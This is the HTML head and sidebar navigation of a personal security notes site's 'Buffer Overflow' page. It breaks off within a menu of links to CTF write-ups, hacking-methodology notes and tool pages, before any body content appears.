<!doctype html><html lang=en class="js csstransforms3d"><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.74.3"><meta name=description content="Buffer Overflowaaaaaaaaaaaaaaaaaaaaaaaaaa."><meta name=author content="Justin Perdok"><link rel=icon href=/images/favicon.png type=image/png><title>Buffer Overflow :: My notes and snippets</title><link href=/css/nucleus.css rel=stylesheet><link href=/css/fontawesome-all.min.css rel=stylesheet><link href=/css/hybrid.css rel=stylesheet><link href=/css/featherlight.min.css rel=stylesheet><link href=/css/perfect-scrollbar.min.css rel=stylesheet><link href=/css/auto-complete.css rel=stylesheet><link href=/css/atom-one-dark-reasonable.css rel=stylesheet><link href=/css/theme.css rel=stylesheet><link href=/css/hugo-theme.css rel=stylesheet><link href=/css/theme-darkblue.css rel=stylesheet><script src=/js/jquery-3.3.1.min.js></script><style>:root #header+#content>#left>#rlblock_left{display:none!important}</style></head><body data-url=/notes/exploit-development/buffer-overflow/><nav id=sidebar><div id=header-wrapper><div id=header><a id=logo href=https://dev-hugo.justin-p.me/></a></div><div class=searchbox><label for=search-by><i class="fas fa-search"></i></label><input data-search-input id=search-by type=search placeholder=Search...>
<span data-search-clear><i class="fas fa-times"></i></span></div><script type=text/javascript src=/js/lunr.min.js></script><script type=text/javascript src=/js/auto-complete.js></script><script type=text/javascript>var baseurl="https:\/\/dev-hugo.justin-p.me\/";</script><script type=text/javascript src=/js/search.js></script></div><div class=highlightable><ul class=topics><li data-nav-id=/commands/ title=Commands class=dd-item><a href=/commands/><i class="fas fa-keyboard"></i>Commands</a><ul><li data-nav-id=/commands/unix/ title=Unix class=dd-item><a href=/commands/unix/><i class="fab fa-linux"></i>Unix</a><ul><li data-nav-id=/commands/unix/awk/ title=awk class=dd-item><a href=/commands/unix/awk/><i class="fas fa-terminal"></i>awk</a></li><li data-nav-id=/commands/unix/base64/ title=base64 class=dd-item><a href=/commands/unix/base64/><i class="fas fa-terminal"></i>base64</a></li><li data-nav-id=/commands/unix/bzip2/ title=bzip2 class=dd-item><a href=/commands/unix/bzip2/><i class="fas fa-terminal"></i>bzip2</a></li><li data-nav-id=/commands/unix/cron/ title=cron class=dd-item><a href=/commands/unix/cron/><i class="fas fa-terminal"></i>cron</a></li><li data-nav-id=/commands/unix/curl/ title=curl class=dd-item><a href=/commands/unix/curl/><i class="fas fa-terminal"></i>curl</a></li><li data-nav-id=/commands/unix/cut/ title=cut class=dd-item><a href=/commands/unix/cut/><i class="fas fa-terminal"></i>cut</a></li><li data-nav-id=/commands/unix/file/ title=file class=dd-item><a href=/commands/unix/file/><i class="fas fa-terminal"></i>file</a></li><li data-nav-id=/commands/unix/find/ title=find class=dd-item><a href=/commands/unix/find/><i class="fas fa-terminal"></i>find</a></li><li data-nav-id=/commands/unix/grep/ title=grep class=dd-item><a href=/commands/unix/grep/><i class="fas fa-terminal"></i>grep</a></li><li data-nav-id=/commands/unix/gzip-gunzip-zcat/ title="gzip gunzip zcat" class=dd-item><a href=/commands/unix/gzip-gunzip-zcat/><i class="fas fa-terminal"></i>gzip gunzip zcat</a></li><li data-nav-id=/commands/unix/md5sum/ title=md5sum class=dd-item><a href=/commands/unix/md5sum/><i class="fas fa-terminal"></i>md5sum</a></li><li data-nav-id=/commands/unix/random/ title=random class=dd-item><a href=/commands/unix/random/><i class="fas fa-terminal"></i>random</a></li><li data-nav-id=/commands/unix/rev/ title=rev class=dd-item><a href=/commands/unix/rev/><i class="fas fa-terminal"></i>rev</a></li><li data-nav-id=/commands/unix/scp/ title=scp class=dd-item><a href=/commands/unix/scp/><i class="fas fa-terminal"></i>scp</a></li><li data-nav-id=/commands/unix/sed/ title=sed class=dd-item><a href=/commands/unix/sed/><i class="fas fa-terminal"></i>sed</a></li><li data-nav-id=/commands/unix/sort/ title=sort class=dd-item><a href=/commands/unix/sort/><i class="fas fa-terminal"></i>sort</a></li><li data-nav-id=/commands/unix/strings/ title=strings class=dd-item><a href=/commands/unix/strings/><i class="fas fa-terminal"></i>strings</a></li><li data-nav-id=/commands/unix/tar/ title=tar class=dd-item><a href=/commands/unix/tar/><i class="fas fa-terminal"></i>tar</a></li><li data-nav-id=/commands/unix/tmux/ title=tmux class=dd-item><a href=/commands/unix/tmux/><i class="fas fa-terminal"></i>tmux</a></li><li data-nav-id=/commands/unix/touch/ title=touch class=dd-item><a href=/commands/unix/touch/><i class="fas fa-terminal"></i>touch</a></li><li data-nav-id=/commands/unix/tr/ title=tr class=dd-item><a href=/commands/unix/tr/><i class="fas fa-terminal"></i>tr</a></li><li data-nav-id=/commands/unix/uniq/ title=uniq class=dd-item><a href=/commands/unix/uniq/><i class="fas fa-terminal"></i>uniq</a></li><li data-nav-id=/commands/unix/xxd/ title=xxd class=dd-item><a href=/commands/unix/xxd/><i class="fas fa-terminal"></i>xxd</a></li></ul></li></ul></li><li data-nav-id=/guides/ title=Guides class=dd-item><a href=/guides/><i class="fas fa-arrow-alt-circle-right"></i>Guides</a><ul><li data-nav-id=/guides/ubuntu-vps/ title="Ubuntu VPS" class=dd-item><a href=/guides/ubuntu-vps/><i class="fab fa-ubuntu"></i>Ubuntu VPS</a><ul><li data-nav-id=/guides/ubuntu-vps/00-intro/ title="00. Introduction" class=dd-item><a href=/guides/ubuntu-vps/00-intro/>00. Introduction</a></li><li data-nav-id=/guides/ubuntu-vps/01-users/ title="01. Adding users" class=dd-item><a href=/guides/ubuntu-vps/01-users/>01. Adding users</a></li><li data-nav-id=/guides/ubuntu-vps/02-packges/ title="02. Managing of packages" class=dd-item><a href=/guides/ubuntu-vps/02-packges/>02. Managing of packages</a></li><li data-nav-id=/guides/ubuntu-vps/03-vim/ title="03. File editor: vim" class=dd-item><a href=/guides/ubuntu-vps/03-vim/>03. File editor: vim</a></li><li data-nav-id=/guides/ubuntu-vps/04-ufw/ title="04. UFW" class=dd-item><a href=/guides/ubuntu-vps/04-ufw/>04. UFW</a></li><li data-nav-id=/guides/ubuntu-vps/05-ssh-keys/ title="05. SSH Keys" class=dd-item><a href=/guides/ubuntu-vps/05-ssh-keys/>05. SSH Keys</a></li><li data-nav-id=/guides/ubuntu-vps/06-setup-sshd/ title="06. Setup sshd" class=dd-item><a href=/guides/ubuntu-vps/06-setup-sshd/>06. Setup sshd</a></li><li data-nav-id=/guides/ubuntu-vps/07-unattended-upgrades/ title="07. Unattended Upgrades" class=dd-item><a href=/guides/ubuntu-vps/07-unattended-upgrades/>07. Unattended Upgrades</a></li><li data-nav-id=/guides/ubuntu-vps/08-fail2ban/ title="08. Fail2ban" class=dd-item><a href=/guides/ubuntu-vps/08-fail2ban/>08. Fail2ban</a></li><li data-nav-id=/guides/ubuntu-vps/09-logwatch/ title="09. Logwatch" class=dd-item><a href=/guides/ubuntu-vps/09-logwatch/>09. Logwatch</a></li><li data-nav-id=/guides/ubuntu-vps/10-sysctl-optimization/ title="10. Sysctl Optimization" class=dd-item><a href=/guides/ubuntu-vps/10-sysctl-optimization/>10. Sysctl Optimization</a></li></ul></li></ul></li><li data-nav-id=/notes/ title=Notes class="dd-item
parent"><a href=/notes/><i class="fas fa-book-reader"></i>Notes</a><ul><li data-nav-id=/notes/courses/ title=Courses class=dd-item><a href=/notes/courses/><i class="fas fa-school"></i>Courses</a><ul><li data-nav-id=/notes/courses/blackhat-python/ title="Blackhat Python" class=dd-item><a href=/notes/courses/blackhat-python/><i class="fas fa-folder"></i>Blackhat Python</a></li><li data-nav-id=/notes/courses/breaching-the-cloud/ title="Breaching The Cloud" class=dd-item><a href=/notes/courses/breaching-the-cloud/><i class="fas fa-folder"></i>Breaching The Cloud</a></li><li data-nav-id=/notes/courses/python4n00bs/ title=Python4N00bs class=dd-item><a href=/notes/courses/python4n00bs/><i class="fas fa-folder"></i>Python4N00bs</a></li><li data-nav-id=/notes/courses/the-cyber-mentor/ title="The Cyber Mentor" class=dd-item><a href=/notes/courses/the-cyber-mentor/><i class="fas fa-folder"></i>The Cyber Mentor</a></li></ul></li><li data-nav-id=/notes/ctfs/ title=CTFs class=dd-item><a href=/notes/ctfs/><i class="fas fa-flag"></i>CTFs</a><ul><li data-nav-id=/notes/ctfs/graficomspoorzoeker/ title="Graficom Spoorzoeker" class=dd-item><a href=/notes/ctfs/graficomspoorzoeker/><i class="fas fa-folder"></i>Graficom Spoorzoeker</a><ul><li data-nav-id=/notes/ctfs/graficomspoorzoeker/challanges/ title=Challanges class=dd-item><a href=/notes/ctfs/graficomspoorzoeker/challanges/><i class="fas fa-question-circle"></i>Challanges</a></li><li data-nav-id=/notes/ctfs/graficomspoorzoeker/solutions/ title=Solutions class=dd-item><a href=/notes/ctfs/graficomspoorzoeker/solutions/><i class="fas fa-check-circle"></i>Solutions</a></li></ul></li><li data-nav-id=/notes/ctfs/htb/ title=HTB class=dd-item><a href=/notes/ctfs/htb/><i class="fas fa-folder"></i>HTB</a><ul><li data-nav-id=/notes/ctfs/htb/bashed/ title=Bashed class=dd-item><a href=/notes/ctfs/htb/bashed/><i class="fas fa-server"></i>Bashed</a></li><li data-nav-id=/notes/ctfs/htb/blue/ title=Blue class=dd-item><a href=/notes/ctfs/htb/blue/><i class="fas fa-server"></i>Blue</a></li><li data-nav-id=/notes/ctfs/htb/devel/ title=Devel class=dd-item><a href=/notes/ctfs/htb/devel/><i class="fas fa-server"></i>Devel</a></li><li data-nav-id=/notes/ctfs/htb/grandpa/ title=Grandpa class=dd-item><a href=/notes/ctfs/htb/grandpa/><i class="fas fa-server"></i>Grandpa</a></li><li data-nav-id=/notes/ctfs/htb/granny/ title=Granny class=dd-item><a href=/notes/ctfs/htb/granny/><i class="fas fa-server"></i>Granny</a></li><li data-nav-id=/notes/ctfs/htb/jerry/ title=Jerry class=dd-item><a href=/notes/ctfs/htb/jerry/><i class="fas fa-server"></i>Jerry</a></li><li data-nav-id=/notes/ctfs/htb/lame/ title=Lame class=dd-item><a href=/notes/ctfs/htb/lame/><i class="fas fa-server"></i>Lame</a></li><li data-nav-id=/notes/ctfs/htb/legacy/ title=Legacy class=dd-item><a href=/notes/ctfs/htb/legacy/><i class="fas fa-server"></i>Legacy</a></li><li data-nav-id=/notes/ctfs/htb/metmon/ title=Netmon class=dd-item><a href=/notes/ctfs/htb/metmon/><i class="fas fa-server"></i>Netmon</a></li><li data-nav-id=/notes/ctfs/htb/nibbles/ title=Nibbles class=dd-item><a href=/notes/ctfs/htb/nibbles/><i class="fas fa-server"></i>Nibbles</a></li><li data-nav-id=/notes/ctfs/htb/optimum/ title=Optimum class=dd-item><a href=/notes/ctfs/htb/optimum/><i class="fas fa-server"></i>Optimum</a></li></ul></li><li data-nav-id=/notes/ctfs/overthewire/ title=OverTheWire class=dd-item><a href=/notes/ctfs/overthewire/><i class="fas fa-folder"></i>OverTheWire</a><ul><li data-nav-id=/notes/ctfs/overthewire/bandit/ title=Bandit class=dd-item><a href=/notes/ctfs/overthewire/bandit/><i class="fas fa-layer-group"></i>Bandit</a></li><li data-nav-id=/notes/ctfs/overthewire/natasa/ title=Natasa class=dd-item><a href=/notes/ctfs/overthewire/natasa/><i class="fas fa-layer-group"></i>Natasa</a></li></ul></li><li data-nav-id=/notes/ctfs/vulnhub/ title=VulnHub class=dd-item><a href=/notes/ctfs/vulnhub/><i class="fas fa-folder"></i>VulnHub</a><ul><li data-nav-id=/notes/ctfs/vulnhub/fristileaks/ title=Fristileaks class=dd-item><a href=/notes/ctfs/vulnhub/fristileaks/><i class="fas fa-folder"></i>Fristileaks</a></li><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/ title=Kioptrix class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/><i class="fas fa-folder"></i>Kioptrix</a><ul><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/level1/ title="Level 1" class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/level1/><i class="fas fa-layer-group"></i>Level 1</a></li><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/level2/ title="Level 2" class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/level2/><i class="fas fa-layer-group"></i>Level 2</a></li><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/level3/ title="Level 3" class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/level3/><i class="fas fa-layer-group"></i>Level 3</a></li><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/level4/ title="Level 4" class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/level4/><i class="fas fa-layer-group"></i>Level 4</a></li></ul></li><li data-nav-id=/notes/ctfs/vulnhub/pwnlab/ title=Pwnlab class=dd-item><a href=/notes/ctfs/vulnhub/pwnlab/><i class="fas fa-folder"></i>Pwnlab</a></li><li data-nav-id=/notes/ctfs/vulnhub/stapler/ title=Stapler class=dd-item><a href=/notes/ctfs/vulnhub/stapler/><i class="fas fa-folder"></i>Stapler</a></li><li data-nav-id=/notes/ctfs/vulnhub/vulnix/ title=Vulnix class=dd-item><a href=/notes/ctfs/vulnhub/vulnix/><i class="fas fa-folder"></i>Vulnix</a></li></ul></li><li data-nav-id=/notes/ctfs/vulnserver/ title=Vulnserver class=dd-item><a href=/notes/ctfs/vulnserver/><i class="fas fa-folder"></i>Vulnserver</a><ul><li data-nav-id=/notes/ctfs/vulnserver/trun/ title=TRUN class=dd-item><a href=/notes/ctfs/vulnserver/trun/><i class="fas fa-layer-group"></i>TRUN</a></li></ul></li></ul></li><li data-nav-id=/notes/exploit-development/ title="Exploit Development" class="dd-item
parent"><a href=/notes/exploit-development/><i class="fas fa-biohazard"></i>Exploit Development</a><ul><li data-nav-id=/notes/exploit-development/buffer-overflow/ title="Buffer Overflow" class="dd-item active"><a href=/notes/exploit-development/buffer-overflow/><i class="fas fa-layer-group"></i>Buffer Overflow</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/ title="Hacking Methodology" class=dd-item><a href=/notes/todo-hacking-methodology/><i class="fas fa-road"></i>Hacking Methodology</a><ul><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/ title="01. Reconnaissance" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/>01. Reconnaissance</a><ul><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/certificate-transparency-logs/ title="Certificate Transparency Logs" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/certificate-transparency-logs/>Certificate Transparency Logs</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/credential-gathering/ title="Credential Gathering" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/credential-gathering/>Credential Gathering</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/dns-recon/ title="DNS Recon" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/dns-recon/>DNS Recon</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/user-enumeration/ title="E-Mail Gathering" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/user-enumeration/>E-Mail Gathering</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/google-dorking/ title="Google Dorking" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/google-dorking/>Google Dorking</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/identify-technologies/ title="Identify Technologies" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/identify-technologies/>Identify Technologies</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/misconfigured-cloud-assets/ title="Misconfigured Cloud Assets" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/misconfigured-cloud-assets/>Misconfigured Cloud Assets</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/phising/ title=phising class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/phising/>phising</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/public-key-disclosure/ title="public key disclosure" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/public-key-disclosure/>public key disclosure</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/shodan/ title=Shodan class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/shodan/>Shodan</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/social-media/ title="Social Media" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/social-media/>Social Media</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/ title="02. Scanning and Enumeration" class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/>02. Scanning and Enumeration</a><ul><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/discover-open-ports/ title="Discover Open Ports" class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/discover-open-ports/>Discover Open Ports</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/finger/ title=Finger class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/finger/>Finger</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/nfs/ title=NFS class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/nfs/>NFS</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/searchsploit/ title=searchsploit class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/searchsploit/>searchsploit</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/smb/ title=smb class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/smb/>smb</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/smtp/ title=smtp class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/smtp/>smtp</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/web/ title=Web class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/web/>Web</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/ title="03. Exploitation" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/>03. Exploitation</a><ul><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/ title="Active Directory" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/>Active Directory</a><ul><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/ title="Attack Tools" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/>Attack Tools</a><ul><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/mitm6/ title=mitm6 class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/mitm6/>mitm6</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/ntlmrelayx/ title=ntlmrelayx class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/ntlmrelayx/>ntlmrelayx</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/psexec/ title=psexec class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/psexec/>psexec</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/responder/ title=responder class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/responder/>responder</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/ipv6-dns-takeover/ title="IPv6 DNS Takeover" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/ipv6-dns-takeover/>IPv6 DNS Takeover</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/llmnr-and-nbt-ns/ title="LLMNR and NBT-NS" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/llmnr-and-nbt-ns/>LLMNR and NBT-NS</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/smb-relay/ title="SMB Relay" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/smb-relay/>SMB Relay</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/wpad/ title=WPAD class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/wpad/>WPAD</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/password-attacks/credential-stuffing/ title="Credential Stuffing" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/password-attacks/credential-stuffing/>Credential Stuffing</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/password-attacks/brute-force/ title=Hydra class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/password-attacks/brute-force/>Hydra</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/password-attacks/password-spraying/ title="Password Spraying" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/password-attacks/password-spraying/>Password Spraying</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/redis/ title=Redis class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/redis/>Redis</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/s3-bucket-fun/ title="s3 bucket fun" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/s3-bucket-fun/>s3 bucket fun</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/shells/ title=Shells class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/shells/>Shells</a><ul><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/shells/msfvenom/ title=msfvenom class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/shells/msfvenom/>msfvenom</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/shells/payloads/ title=payloads class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/shells/payloads/>payloads</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/sql-injection/ title="SQL Injection" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/sql-injection/>SQL Injection</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/web-servers/ title="Web Servers" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/web-servers/>Web Servers</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/ title="04. Post Exploitation" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/>04. Post Exploitation</a><ul><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/ title=activedirectory class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/>activedirectory</a><ul><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/credential-access/ title=credentialaccess class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/credential-access/>credentialaccess</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/powerview/ title=powerview class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/powerview/>powerview</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/pdf/encrypted-password-protected-pdf/ title="encrypted password protected pdf" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/pdf/encrypted-password-protected-pdf/>encrypted password protected pdf</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/zip/encrypted-password-protected-zip/ title="encrypted password protected zip" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/zip/encrypted-password-protected-zip/>encrypted password protected zip</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/passwords/hash-identifier/ title="hash identifier" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/passwords/hash-identifier/>hash identifier</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/passwords/hashcat/ title=hashcat class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/passwords/hashcat/>hashcat</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/post-compermise-recon/ title="post compromise recon" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/post-compermise-recon/>post compromise recon</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/priv-esc/ title="priv esc" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/priv-esc/>priv esc</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/shell-escaping/ title="shell escaping" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/shell-escaping/>shell escaping</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/steal-access-tokens/ title="steal access tokens" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/steal-access-tokens/>steal access tokens</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/passwords/unshadow/ title=unshadow class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/passwords/unshadow/>unshadow</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/wordpress/wpadmin-plugin-upload/ title="wpadmin plugin upload" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/wordpress/wpadmin-plugin-upload/>wpadmin plugin upload</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/05-cleanup/ title="05. Cleanup" class=dd-item><a href=/notes/todo-hacking-methodology/05-cleanup/>05. Cleanup</a></li></ul></li><li data-nav-id=/notes/networking/ title=Networking class=dd-item><a href=/notes/networking/><i class="fas fa-network-wired"></i>Networking</a><ul><li data-nav-id=/notes/networking/osi-model/ title="OSI Model" class=dd-item><a href=/notes/networking/osi-model/><i class="fas fa-ethernet"></i>OSI Model</a><ul><li data-nav-id=/notes/networking/osi-model/layer1/ title="Layer 1" class=dd-item><a href=/notes/networking/osi-model/layer1/><i class="fas fa-ethernet"></i>Layer 1</a></li><li data-nav-id=/notes/networking/osi-model/layer2/ title="Layer 2" class=dd-item><a href=/notes/networking/osi-model/layer2/><i class="fas fa-ethernet"></i>Layer 2</a></li><li data-nav-id=/notes/networking/osi-model/layer3/ title="Layer 3" class=dd-item><a href=/notes/networking/osi-model/layer3/><i class="fas fa-ethernet"></i>Layer 3</a></li><li data-nav-id=/notes/networking/osi-model/layer4/ title="Layer 4" class=dd-item><a href=/notes/networking/osi-model/layer4/><i class="fas fa-ethernet"></i>Layer 4</a></li><li data-nav-id=/notes/networking/osi-model/layer5/ title="Layer 5" class=dd-item><a href=/notes/networking/osi-model/layer5/><i class="fas fa-ethernet"></i>Layer 5</a></li><li data-nav-id=/notes/networking/osi-model/layer6/ title="Layer 6" class=dd-item><a href=/notes/networking/osi-model/layer6/><i class="fas fa-ethernet"></i>Layer 6</a></li><li data-nav-id=/notes/networking/osi-model/layer7/ title="Layer 7" class=dd-item><a href=/notes/networking/osi-model/layer7/><i class="fas fa-ethernet"></i>Layer 7</a></li></ul></li><li data-nav-id=/notes/networking/tcpip-model/ title="TCP/IP Model" class=dd-item><a href=/notes/networking/tcpip-model/><i class="fas fa-ethernet"></i>TCP/IP Model</a></li></ul></li><li data-nav-id=/notes/programming/ title=Programming class=dd-item><a href=/notes/programming/><i class="fas fa-code"></i>Programming</a><ul><li data-nav-id=/notes/programming/bash/ title=Bash class=dd-item><a href=/notes/programming/bash/><i class="fas fa-layer-group"></i>Bash</a></li><li data-nav-id=/notes/programming/docker-compose/ title=Docker-Compose class=dd-item><a href=/notes/programming/docker-compose/><i class="fas fa-layer-group"></i>Docker-Compose</a></li><li data-nav-id=/notes/programming/dockerfile/ title=Dockerfile class=dd-item><a href=/notes/programming/dockerfile/><i class="fas fa-layer-group"></i>Dockerfile</a></li><li data-nav-id=/notes/programming/markdown/ title=Markdown class=dd-item><a href=/notes/programming/markdown/><i class="fas fa-layer-group"></i>Markdown</a></li><li data-nav-id=/notes/programming/mysql/ title=MySQL class=dd-item><a href=/notes/programming/mysql/><i class="fas fa-layer-group"></i>MySQL</a></li><li data-nav-id=/notes/programming/python/ title=Python class=dd-item><a href=/notes/programming/python/><i class="fas fa-layer-group"></i>Python</a></li></ul></li><li data-nav-id=/notes/z_private/ title=Z_Private class=dd-item><a href=/notes/z_private/><i class="fas fa-lock"></i>Private</a></li></ul></li><li data-nav-id=/tools/ title=Tools class=dd-item><a href=/tools/><i class="fas fa-tools"></i>Tools</a><ul><li data-nav-id=/tools/00-c2-frameworks/ title="'C2 Frameworks'" class=dd-item><a href=/tools/00-c2-frameworks/><i class="fas fa-folder"></i>C2 Frameworks</a><ul><li data-nav-id=/tools/00-c2-frameworks/empire/ title=Empire class=dd-item><a href=/tools/00-c2-frameworks/empire/><i class="fas fa-wrench"></i>Empire</a></li><li data-nav-id=/tools/00-c2-frameworks/metasploit/ title=Metasploit class=dd-item><a href=/tools/00-c2-frameworks/metasploit/><i class="fas fa-wrench"></i>Metasploit</a></li></ul></li><li data-nav-id=/tools/00-forensic/ title="'Forensic'" class=dd-item><a href=/tools/00-forensic/><i class="fas fa-folder"></i>Forensic</a><ul><li data-nav-id=/tools/00-forensic/exiftool/ title=exiftool class=dd-item><a href=/tools/00-forensic/exiftool/><i class="fas fa-wrench"></i>exiftool</a></li><li data-nav-id=/tools/00-forensic/ssh-sha256-to-public-key/ title="ssh sha256 to public key" class=dd-item><a href=/tools/00-forensic/ssh-sha256-to-public-key/><i class="fas fa-wrench"></i>ssh sha256 to public key</a></li><li data-nav-id=/tools/00-forensic/usbrip/ title=usbrip class=dd-item><a href=/tools/00-forensic/usbrip/><i class="fas fa-wrench"></i>usbrip</a></li></ul></li><li data-nav-id=/tools/00-steganography/ title="'Steganography'" 